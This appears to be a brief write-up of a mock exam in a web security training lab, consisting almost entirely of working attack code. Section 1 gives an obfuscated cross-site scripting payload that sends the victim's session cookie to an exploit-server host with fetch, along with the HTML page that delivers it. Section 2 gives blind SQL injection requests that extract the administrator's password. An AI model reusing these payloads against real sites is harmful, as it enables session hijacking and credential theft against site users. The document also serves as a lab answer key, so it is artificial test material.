# Mock Exam 2023.08.29

### 1. Someone's access

Payload
```js
};a=this['String']['fromCharCode'],b='https://exploit-'+('0a540013035f63ce814a1f9d010c00e2'+a(46)+'exploit-server'+a(46)+'net')+'/exploit?stolen_cookie='+this['document']['cookie'],fetch(b);//

```

Exploit server
```html
<html>
    <body>
        <script>
            window.location = 'https://0ab60004036e63e081c12077000b000a.web-security-academy.net/?SearchTerm=%22%7D%3Bb%3D%28%27https%3A%2F%2Fexploit-%27%2B%270a540013035f63ce814a1f9d010c00e2%27%2Bwindow%5B%27String%27%5D%5B%27fromCharCode%27%5D%2846%29%2B%27exploit-server%27%2Bwindow%5B%27String%27%5D%5B%27fromCharCode%27%5D%2846%29%2B%27net%27%29%2B%27%2Fexploit%3Fstolen_cookie%3D%27%2Bwindow%5B%27document%27%5D%5B%27cookie%27%5D%2Cfetch%28b%29%3B%2F%2F%22';
        </script>
    </body>
</html>

```

### 2. Admin access

SQLi Intruder
```
GET /advanced_search?SearchTerm=&organize_by=(case+when+(SELECT+COUNT(*)+FROM+users+WHERE+username+=+'administrator'+and+SUBSTR(password,1,1)='ยงaยง')>0+then+author+else+title+end)+LIMIT+1+--+&blogArtist= HTTP/2
```

Last check SQLi
```
GET /advanced_search?SearchTerm=&organize_by=(case+when+(SELECT+COUNT(*)+FROM+users+WHERE+username+=+'administrator'+and+password='tcrw0xbtv7i3r62nee0e')>0+then+author+else+title+end)+LIMIT+1+--+&blogArtist= HTTP/2
```

### 3. Root access

